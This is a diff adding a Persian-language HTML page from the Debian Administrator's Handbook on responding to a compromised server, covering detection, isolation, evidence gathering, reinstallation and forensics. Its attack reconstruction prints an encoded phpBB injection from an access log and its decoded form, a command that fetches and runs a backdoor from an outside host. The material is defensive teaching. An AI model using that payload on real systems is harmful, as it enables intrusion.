@@ -1,0 +1,316 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html
+    xmlns="http://www.w3.org/1999/xhtml"><head><meta
+        http-equiv="Content-Type"
+        content="text/html; charset=UTF-8" /><title
+        xmlns:d="http://docbook.org/ns/docbook">14.7. مواجهه با یک ماشین نفوذپذیر</title><link
+        rel="stylesheet"
+        type="text/css"
+        href="Common_Content/css/default.css" /><link
+        rel="stylesheet"
+        media="print"
+        href="Common_Content/css/print.css"
+        type="text/css" /><meta
+        xmlns:d="http://docbook.org/ns/docbook"
+        name="generator"
+        content="publican v4.3.2" /><meta
+        xmlns:d="http://docbook.org/ns/docbook"
+        name="package"
+        content="Debian-debian-handbook-9-fa-IR-1.0-1" /><meta
+        name="keywords"
+        content="فایروال, Netfilter, IDS/NIDS" /><link
+        rel="home"
+        href="index.html"
+        title="راهنمای دبیان برای مدیر سیستم‌ها" /><link
+        rel="up"
+        href="security.html"
+        title="فصل 14. امنیت" /><link
+        rel="prev"
+        href="sect.other-security-considerations.html"
+        title="14.6. سایر ملاحظات مرتبط با امنیت" /><link
+        rel="next"
+        href="debian-packaging.html"
+        title="فصل 15. Creating a Debian Package" /><meta
+        xmlns=""
+        name="flattr:id"
+        content="4pz9jq" /><link
+        xmlns=""
+        rel="canonical"
+        href="https://debian-handbook.info/browse/fa-IR/stable/sect.dealing-with-compromised-machine.html" /></head><body
+      dir="rtl"><div
+        id="banner"><a
+          href="http://debian-handbook.info/get/"><span
+            class="text">Download the ebook</span></a></div><p
+        id="title"><a
+          class="left"
+          href="http://www.debian.org"><img
+            alt="Product Site"
+            src="Common_Content/images//image_left.png" /></a><a
+          class="right"
+          href="index.html"><img
+            alt="Documentation Site"
+            src="Common_Content/images//image_right.png" /></a></p><ul
+        class="docnav top"><li
+          class="previous"><a
+            accesskey="p"
+            href="sect.other-security-considerations.html"><strong>قبلی</strong></a></li><li
+          class="home">راهنمای دبیان برای مدیر سیستم‌ها</li><li
+          class="next"><a
+            accesskey="n"
+            href="debian-packaging.html"><strong>بعدی</strong></a></li></ul><div
+        class="section"><div
+          class="titlepage"><div><div><h2
+                class="title"><a
+                  xmlns=""
+                  id="sect.dealing-with-compromised-machine"></a>14.7. مواجهه با یک ماشین نفوذپذیر</h2></div></div></div><div
+          class="para">
+			برخلاف طراحی خوب یک خط مشی امنیتی، یک مدیر سیستم معمولا با یک عمل hijacking مواجه می‌شود. این قسمت به بررسی مواردی می‌پردازد که در مواجهه با چنین شرایط نامطلوبی باید مد نظر قرار گرفته شوند.
+		</div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    xmlns=""
+                    id="id-1.17.10.3"></a>14.7.1. شناسایی و مشاهده نفوذ خرابکار</h3></div></div></div><div
+            class="para">
+				اولین گام در مواجهه با یک نفوذ، شناسایی چنین اقدامی است. اینکار به راحتی صورت نمی‌پذیرد، به خصوص اگر زیرساخت مناسب مانیتورینگ موجود نباشد.
+			</div><div
+            class="para">
+				اقدامات خرابکارانه مادامی که تاثیر منفی خود را روی سرویس‌های یک ماشین نگذارند قابل شناسایی نیستند، از جمله کاهش سرعت ارتباطات، قطع ارتباط برخی کاربران با سیستم یا هر گونه عیب و ایراد دیگر. در مواجهه با این مشکلات، مدیر سیستم باید با نگاهی دقیق به ماشین به بررسی آنچه درست عمل نمی‌کند بپردازد. این مورد زمانی اتفاق می‌افتد که یک فرآیند غیرمعمول در سیستم مشاهده شود، برای نمونه <code
+              class="literal">apache</code> بجای فرآیند استاندارد <code
+              class="literal">/usr/sbin/apache2</code>. با دنبال کردن این مثال، کاری که باید انجام داد یادداشت برداری از شناسه فرآیند مذکور و بررسی <code
+              class="filename">/proc/<em
+                class="replaceable">pid</em>/exe</code> به منظور اینکه فرآیند قصد اجرای کدام برنامه را داشته است:
+			</div><pre
+            class="screen">
+<code
+              class="computeroutput"># </code><strong
+              class="userinput"><code>ls -al /proc/3719/exe</code></strong>
+<code
+              class="computeroutput">lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</code>
+</pre><div
+            class="para">
+				برنامه‌ای که در <code
+              class="filename">/var/tmp/</code> نصب شده و به عنوان سرور وب کار می‌کند؟ بدون شک، ماشین مورد نفوذ قرار گرفته است.
+			</div><div
+            class="para">
+				این تنها یک مثال بود، اما شواهد بسیاری وجود دارد که می‌تواند برای مدیر سیستم هشدار دهنده باشد:
+			</div><div
+            xmlns:d="http://docbook.org/ns/docbook"
+            class="itemizedlist"><ul><li
+                class="listitem"><div
+                  class="para">
+						یک گزینه برای دستوری که هم اکنون کار نمی‌کند؛ نسخه نرم‌افزاری که دستور ادعای آن را می‌کند با نسخه‌ای که از <code
+                    class="command">dpkg</code> پرس و جو شده است سازگاری ندارد؛
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						یک خط فرمان یا پیام خوش‌آمدگویی که بیان می‌کند آخرین ارتباط برقرار شده از یک قاره دیگر بوده است؛
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						خطاهایی که از پر شدن پارتیشن <code
+                    class="filename">/tmp/</code> به دلیل وجود نسخه‌های غیرقانونی از فیلم‌های مختلف تولید شده است؛
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						و از این قبیل.
+					</div></li></ul></div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    xmlns=""
+                    id="id-1.17.10.4"></a>14.7.2. خاموش کردن سرور</h3></div></div></div><div
+            class="para">
+				در اکثر موارد، مهاجم از طریق یک شبکه به ماشین نفوذ کرده است و برای ادامه نفوذ خود به یک شبکه فعال نیاز دارد (به منظور دسترسی به داده‌های محرمانه، اشتراک‌گذاری فایل‌های غیرقانونی، پنهان‌سازی هویت خود با تبدیل ماشین به یک relay و از این قبیل). قطع ارتباط فیزیکی رایانه با شبکه از دسترسی بیشتر مهاجم به سیستم‌های هدف پیشگیری می‌کند، اگر تاکنون به این مهم دست نیافته باشد.
+			</div><div
+            class="para">
+				اینکار تنها در صورت دسترسی فیزیکی به سرور ممکن است. زمانی که سرور در یک مرکز داده سرویس میزبانی درون کشور قرار گرفته یا به هر دلیل دیگر قابل دسترس نباشد، ایده خوبی است که اطلاعات بیشتری در این مورد جمع‌آوری (<a
+              class="xref"
+              href="sect.dealing-with-compromised-machine.html#sect.keeping-everything-that-could-be-used-as-evidence">
+      قسمت 14.7.3, “نگهداری هر آنچه که می‌تواند به عنوان مدرک استفاده شود”
+    </a>، <a
+              class="xref"
+              href="sect.dealing-with-compromised-machine.html#sect.forensic-analysis">
+      قسمت 14.7.5, “بررسی و تحلیل قضایی”
+    </a> و <a
+              class="xref"
+              href="sect.dealing-with-compromised-machine.html#sect.reconstituting-the-attack-scenario">
+      قسمت 14.7.6, “بازسازی سناریوی حمله”
+    </a> را مشاهده کنید)، سپس تا آنجا که امکان دارد سرور را با استفاده از خاموش کردن سرویس‌های ممکن ایزوله کنیم (معمولا، همه سرویس‌ها بجز <code
+              class="command">sshd</code>). این مورد نیز مشکلات خود را دارد، چون کسی نمی‌تواند بگوید آیا مهاجم نیز مانند مدیر سیستم دسترسی SSH را بدست گرفته است یا خیر: اینکار “پاکسازی” ماشین را دشوارتر می‌سازد.
+			</div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    xmlns=""
+                    id="sect.keeping-everything-that-could-be-used-as-evidence"></a>14.7.3. نگهداری هر آنچه که می‌تواند به عنوان مدرک استفاده شود</h3></div></div></div><div
+            class="para">
+				درک حمله و/یا اقدامات قانونی مقابل مهاجمین نیازمند نسخه‌برداری از مهم‌ترین عناصر حمله می‌باشد؛ این فهرست شامل محتوای هارد دیسک، فهرستی از تمام فرآیندهای اجرایی و فهرستی از تمام ارتباطات باز می‌باشد. از محتوای موجود در RAM نیز می‌توان استفاده کرد ولی به ندرت در دنیای واقعی کاربرد دارد.
+			</div><div
+            class="para">
+				در زمان وقوع حادثه، مدیر سیستم‌ها اغلب وسوسه می‌شند که بررسی‌های بسیاری را روی ماشین نفوذی انجام دهند؛ اینکار معمولا ایده خوبی نیست. هر دستوری که اجرا می‌شود به احتمال زیاد دستکاری شده است و ممکن است بخشی از شواهد را از بین ببرد. این بررسی‌ها باید محدود به مجموعه کوچکی شوند (<code
+              class="command">netstat -tupan</code> برای ارتباطات شبکه، <code
+              class="command">ps auxf</code> برای فهرستی از فرآیندها و <code
+              class="command">ls -alR /proc/[0-9]*</code> برای اطلاعات بیشتر در مورد برنامه‌های در حال اجرا) و هرگونه بررسی انجام شده باید یادداشت گردد.
+			</div><div
+            class="sidebar"><div
+              class="titlepage"><div><div><p
+                    class="title"><strong><span
+                        class="emphasis"><em>احتیاط</em></span> بررسی و تحلیل داغ</strong></p></div></div></div><div
+              class="para">
+				با اینکه بررسی سیستم در حال اجرا یک امر قابل اجرا است، به خصوص زمانی که سرور به صورت فیزیکی قابل دسترس نباشد، بهتر است که از اینکار خودداری کنیم: به سادگی نمی‌توان از صحت برنامه‌های نصب شده روی سیستم اطمینان حاصل کرد. این امکان وجود دارد که یک دستور <code
+                class="command">ps</code> دستکاری شده برخی فرآیندها را نشان ندهد، یا یک دستور <code
+                class="command">ls</code> دستکاری شده برخی فایل‌ها را پنهان سازد؛ گاهی اوقات حتی کرنل نیز مورد نفوذ قرار می‌گیرد!
+			</div><div
+              class="para">
+				اگر هنوز نیاز به چنین بررسی و تحلیلی باشد، باید احتیاط کرد که تنها از برنامه‌های شناخته شده استفاده کنیم. یک روش خود استفاده از دیسک نجاتی است که شامل برنامه‌های تر و تازه باشد، یا یک اشتراک شبکه فقط خواندنی. با این حال، حتی این اقدامات نیز در صورت نفوذ به کرنل بی‌فایده خواهند بود.
+			</div></div><div
+            class="para">
+				زمانی که این عنصرهای ... ذخیره‌سازی شوند، گام بعدی ذخیره‌سازی یک تصویر کامل از هارد-دیسک است. ایجاد چنین تصویری در صورت تغییر اندازه فایل سیستم غیرممکن است، به همین دلیل است که ابتدا باید به صورت فقط-خواندنی متصل گردد. ساده‌ترین راهکار توقف اجباری سرور (پس از اجرای <code
+              class="command">sync</code>) و اجرای مجدد آن روی یک دیسک نجات است. هر پارتیشن باید با ابزاری مانند <code
+              class="command">dd</code> رونوشت گرفته شود؛ این تصاویر می‌توانند به سرور دیگری فرستاده شوند (احتمالا با ابزار <code
+              class="command">nc</code>). احتمال دیگر حتی از این نیز ساده‌تر است: تنها کافی است دیسک را از ماشین خارج کرده و با یک دیسک جدید جایگزین کنیم تا بتوان عملیات فرمت‌دهی و نصب مجدد را انجام داد.
+			</div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    xmlns=""
+                    id="id-1.17.10.6"></a>14.7.4. نصب مجدد</h3></div></div></div><a
+            id="id-1.17.10.6.2"
+            class="indexterm"></a><div
+            class="para">
+				قبل از اجرای نصب مجدد، سرور نباید به حالت آنلاین بازگردد. اگر نفوذ در بالاترین سطح اتفاق افتاده باشد (یعنی تمام دسترسی‌های مدیریتی) تقریبا هیچ راهی وجود ندارد تا اطمینان یابیم مهاجم چه ابزارهایی را در سرور باقی گذاشته است (به طور مشخص <span
+              class="emphasis"><em>backdoor</em></span>). البته، تمام بروزرسانی‌های امنیتی اخیر نیز به منظور مقابله با آسیب‌پذیری که مهاجم از آن سواستفاده کرده است باید انجام شوند. ایده‌آل است که بررسی و تحلیل حمله به این عامل مهم توجه کند، تا بتوان آن را در ادامه برطرف نمود؛ در غیر اینصورت، باید امیدوار باشیم که این آسیب‌پذیری یکی از همان مواردی بوده است که توسط بروزرسانی امنیتی برطرف شده است.
+			</div><div
+            class="para">
+				نصب مجدد یک سرور راه‌دور همیشه آسان نیست؛ ممکن است به کمک شرکت میزبانی احتیاج باشد، زیرا همه این شرکت‌ها دارای سیستم‌های نصب مجدد خودکار نیستند. باید احتیاط کرد که از فایل‌های پشتیبان تهیه شده پس از نفوذ برای بازیابی ماشین استفاده نشود. ایده‌آل است که تنها داده‌ها را بازیابی کنیم و تمام نرم‌افزارهای کاربردی از نو نصب شوند.
+			</div></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    xmlns=""
+                    id="sect.forensic-analysis"></a>14.7.5. بررسی و تحلیل قضایی</h3></div></div></div><div
+            class="para">
+				اکنون که سرویس‌ها به حالت قبلی خود بازگشته‌اند، زمان آن فرا رسیده است که نگاهی عمیق‌تر به تصاویر ذخیره شده از دیسک‌های مورد نفوذ قرار گرفته شده بیندازیم تا عامل حمله را بهتر درک کنیم. زمانی که قصد استفاده از این تصاویر را داریم، باید احتیاط کرد که تنها از گزینه‌های <code
+              class="literal">ro,nodev,noexec,noatime</code> به منظور پیشگیری از دستکاری محتوای دیسک (از جمله زمان دسترسی به فایل‌ها) یا اجرایی اشتباهی برنامه‌ها استفاده کنیم.
+			</div><div
+            class="para">
+				پیگیری یک سناریوی حمله معمولا شامل جستجو برای هر آنچه تغییر یافته یا اجرا شده است می‌باشد:
+			</div><div
+            xmlns:d="http://docbook.org/ns/docbook"
+            class="itemizedlist"><ul><li
+                class="listitem"><div
+                  class="para">
+						فایل‌های <code
+                    class="filename">.bash_history</code> اغلب اطلاعات مفیدی را فراهم می‌کنند؛
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						به همین صورت فهرست فایل‌هایی که اخیرا ایجاد، تغییر یا دسترسی یافته‌اند؛
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						دستور <code
+                    class="command">strings</code>، با استخراج رشته‌های متنی از یک فایل باینری، به شناسایی برنامه‌های نصب شده توسط مهاجم کمک می‌کند؛
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						فایل‌های گزارش موجود در <code
+                    class="filename">/var/log/</code> اغلب ساختار زمانی و ترتیب اجرای وقایع را شرح می‌دهند؛
+					</div></li><li
+                class="listitem"><div
+                  class="para">
+						ابزارهای خاص-منظوره همچنین امکان بازیابی محتوای فایل‌های حذف شده را فراهم می‌کنند، از جمله فایل‌های گزارشی که مهاجم آن‌ها را پاک کرده است.
+					</div></li></ul></div><div
+            class="para">
+				برخی از این عملیات می‌توانند با استفاده از یک نرم‌افزار اختصاصی ساده‌سازی گردند. به طور مشخص، بسته <span
+              class="pkg pkg">sleuthkit</span> ابزارهای بسیاری را برای بررسی یک فایل سیستم فراهم می‌کند. کاربرد آن‌ها با استفاده از رابط گرافیکی <span
+              class="emphasis"><em>Autopsy Forensic Browser</em></span> (در بسته <span
+              class="pkg pkg">autopsy</span>) بسیار ساده شده است.
+			</div><a
+            id="id-1.17.10.7.6"
+            class="indexterm"></a><a
+            id="id-1.17.10.7.7"
+            class="indexterm"></a></div><div
+          class="section"><div
+            class="titlepage"><div><div><h3
+                  class="title"><a
+                    xmlns=""
+                    id="sect.reconstituting-the-attack-scenario"></a>14.7.6. بازسازی سناریوی حمله</h3></div></div></div><div
+            class="para">
+				تمام عنصرهای جمع‌آوری شده حین بررسی و تحلیل باید به صورت قطعه‌های یک پازل کنار یکدیگر قرار گیرند؛ ایجاد اولین فایل‌ها مشکوک اغلب مرتبط با گزارش‌های مربوط به نفوذ می‌باشد. یک مثال واقعی می‌تواند منظور را بهتر از مفاهیم نظری طولانی منتقل کند.
+			</div><div
+            class="para">
+				گزارش پیش رو از یک فایل <code
+              class="filename">access.log</code> آپاچی استخراج شده است:
+			</div><pre
+            class="programlisting">
+www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] "GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1" 200 27969 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+</pre><div
+            class="para">
+				این مثال با یک آسیب‌پذیری قدیمی در نرم‌افزار phpBB سازگاری دارد. <div
+              xmlns=""
+              class="url">→ <a
+                xmlns="http://www.w3.org/1999/xhtml"
+                href="http://secunia.com/advisories/13239/">http://secunia.com/advisories/13239/</a></div> <div
+              xmlns=""
+              class="url">→ <a
+                xmlns="http://www.w3.org/1999/xhtml"
+                href="http://www.phpbb.com/phpBB/viewtopic.php?t=240636">http://www.phpbb.com/phpBB/viewtopic.php?t=240636</a></div>
+			</div><div
+            class="para">
+				رمزگشایی این نشانی طولانی باعث می‌شود درک بهتری از قصد مهاجم از اجرای کد PHP را داشته باشیم که برابر است با: <code
+              class="command">system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</code>. در حقیقت، یک فایل <code
+              class="filename">bd</code> در <code
+              class="filename">/tmp/</code> پیدا شده است. اجرای <code
+              class="command">strings /mnt/tmp/bd</code> در میان سایر رشته‌ها عبارت <code
+              class="literal">PsychoPhobia Backdoor is starting...</code> را باز می‌گرداند. این ابزار شباهت زیادی به یک backdoor دارد.
+			</div><div
+            class="para">
+				در زمان دیگری، از این دسترسی به منظور دانلود، نصب و اجرای یک <span
+              class="emphasis"><em>bot</em></span> از نوع IRC که به یک شبکه زیرزمینی متصل شده بود، استفاده می‌شد. این ربات از طریق این پروتکل قابل کنترل بود که باعث می‌شد بتواند فایل‌های گوناگونی را به منظور اشتراک‌گذاری دانلود کند. این برنامه حتی فایل گزارش مخصوص به خود را دارد:
+			</div><pre
+            class="programlisting">** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)
+** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT
+** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024
+** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating
+** 2004-11-29-19:50:20: DCC CHAT Correct password
+(...)
+** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_-DvdScr.avi (713034KB)
+(...)
+** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi (666615KB)
+(...)
+** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)
+(...)
+** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)</pre><div
+            class="para">
+				این فایل نشان می‌دهد که دو فایل ویدیویی با استفاده از نشانی IP 82.50.72.202 روی سرور ذخیره‌سازی شده‌اند.
+			</div><div
+            class="para">
+				به صورت موازی، مهاجم اقدام به دانلود چند فایل اضافی کرده است، <code
+              class="filename">/tmp/pt</code> و <code
+              class="filename">/tmp/loginx</code>. اجرای <code
+              class="command">strings</code> روی این دو برنامه عبارت‌های <span
+              class="foreignphrase"><em
+                class="foreignphrase">Shellcode placed at 0x%08lx</em></span> و <span
+              class="foreignphrase"><em
+                class="foreignphrase">Now wait for suid shell...</em></span> را باز می‌گرداند. این‌ها مانند برنامه‌هایی هستند که با استفاده از آسیب‌پذیری‌های محلی قصد اتخاذ دسترسی‌های سطح بالاتر را دارند. آیا به هدف خود رسیده‌اند؟ در این مورد، احتمالا خیر، چرا که پس از نفوذ اولیه به سیستم هیچ فایل دیگری تغییر نیافته است.
+			</div><div
+            class="para">
+				در این مثال، تمام حمله بازسازی شده است و می‌توان نتیجه گرفت که مهاجم به مدت سه روز کنترل سیستم را در دست داشته است؛ اما مهم‌ترین عنصر در این حمله آن است که آسیب‌پذیری شناسایی شده است و مدیر سیستم می‌تواند اطمینان یابد که با نصب بروزرسانی امنیتی آن را برطرف کرده است.
+			</div></div></div><ul
+        class="docnav"><li
+          class="previous"><a
+            accesskey="p"
+            href="sect.other-security-considerations.html"><strong>قبلی</strong>14.6. سایر ملاحظات مرتبط با امنیت</a></li><li
+          class="up"><a
+            accesskey="u"
+            href="#"><strong>بالا</strong></a></li><li
+          class="home"><a
+            accesskey="h"
+            href="index.html"><strong>خانه</strong></a></li><li
+          class="next"><a
+            accesskey="n"
+            href="debian-packaging.html"><strong>بعدی</strong>
+      فصل 15. Creating a Debian Package</a></li></ul></body></html>
